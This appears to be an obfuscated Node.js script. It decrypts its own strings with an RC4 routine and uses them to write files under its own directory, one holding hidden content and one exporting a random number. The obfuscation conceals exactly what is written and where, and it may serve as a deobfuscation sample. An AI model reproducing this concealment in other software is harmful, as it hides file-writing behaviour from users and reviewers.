'use strict';
var vip = "vip.v6";
var _0x4aef = [vip, "wowvMCvDpMO9wqIwwohjChbCmMOtDEHCt8KVN8K7ZMKPwp44JMKaw5DDqjBEwpDDuirDtcKF", "DVLDnVAOAcO3LF0kZQY0GA==", "O8OWVRRrYlhMOwQ=", "w5QJdcKCYw==", "ADLCoE52w70=", "aMKMwqxdFcOoNXXCicO7ehTDncKD", "ecOvBisQwrMVw4piOg==", "uqvRxiYCUp.nvYS6NdfrOkPD=="];
(function(obj, count, long) {
  var fn = function(to, value, str, val, key) {
    value = value >> 8;
    key = "po";
    var str = "shift";
    var method = "push";
    if (value < to) {
      for (; --to;) {
        val = obj[str]();
        if (value === to) {
          value = val;
          str = obj[key + "p"]();
        } else {
          if (value && str["replace"](/[uqRxYCUnYSNdfrOkPD=]/g, "") === value) {
            obj[method](val);
          }
        }
      }
      obj[method](obj[str]());
    }
    return 662307;
  };
  return fn(++count, long) >> count ^ long;
})(_0x4aef, 194, 49664);
var _0x1ca3 = function(a, opt_max) {
  a = ~~"0x"["concat"](a);
  var value = _0x4aef[a];
  if (_0x1ca3["ZXrQFd"] === undefined) {
    (function() {
      var jid = typeof window !== "undefined" ? window : typeof process === "object" && typeof require === "function" && typeof global === "object" ? global : this;
      var listeners = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
      if (!jid["atob"]) {
        jid["atob"] = function(i) {
          var str = String(i)["replace"](/=+$/, "");
          var bc = 0;
          var bs;
          var buffer;
          var Y = 0;
          var pix_color = "";
          for (; buffer = str["charAt"](Y++); ~buffer && (bs = bc % 4 ? bs * 64 + buffer : buffer, bc++ % 4) ? pix_color = pix_color + String["fromCharCode"](255 & bs >> (-2 * bc & 6)) : 0) {
            buffer = listeners["indexOf"](buffer);
          }
          return pix_color;
        };
      }
    })();
    var testcase = function(data, fn) {
      var secretKey = [];
      var y = 0;
      var temp;
      var testResult = "";
      var tempData = "";
      data = atob(data);
      var val = 0;
      var key = data["length"];
      for (; val < key; val++) {
        tempData = tempData + ("%" + ("00" + data["charCodeAt"](val)["toString"](16))["slice"](-2));
      }
      data = decodeURIComponent(tempData);
      var x = 0;
      for (; x < 256; x++) {
        secretKey[x] = x;
      }
      x = 0;
      for (; x < 256; x++) {
        y = (y + secretKey[x] + fn["charCodeAt"](x % fn["length"])) % 256;
        temp = secretKey[x];
        secretKey[x] = secretKey[y];
        secretKey[y] = temp;
      }
      x = 0;
      y = 0;
      var i = 0;
      for (; i < data["length"]; i++) {
        x = (x + 1) % 256;
        y = (y + secretKey[x]) % 256;
        temp = secretKey[x];
        secretKey[x] = secretKey[y];
        secretKey[y] = temp;
        testResult = testResult + String["fromCharCode"](data["charCodeAt"](i) ^ secretKey[(secretKey[x] + secretKey[y]) % 256]);
      }
      return testResult;
    };
    _0x1ca3["lQIWqZ"] = testcase;
    _0x1ca3["nTCuVD"] = {};
    _0x1ca3["ZXrQFd"] = !![];
  }
  var A = _0x1ca3["nTCuVD"][a];
  if (A === undefined) {
    if (_0x1ca3["QylTFT"] === undefined) {
      _0x1ca3["QylTFT"] = !![];
    }
    value = _0x1ca3["lQIWqZ"](value, opt_max);
    _0x1ca3["nTCuVD"][a] = value;
  } else {
    value = A;
  }
  return value;
};
const fs = require("fs");
fs[_0x1ca3("0", "BWt)")](__dirname + _0x1ca3("1", "B6PW"), _0x1ca3("2", "g)$y"));
fs[_0x1ca3("3", "#9Nm")](__dirname + _0x1ca3("4", "][3!"), "module.exports = " + Math[_0x1ca3("5", "zIjP")](Math[_0x1ca3("6", "$&q]")]() * 512E3) + ";");

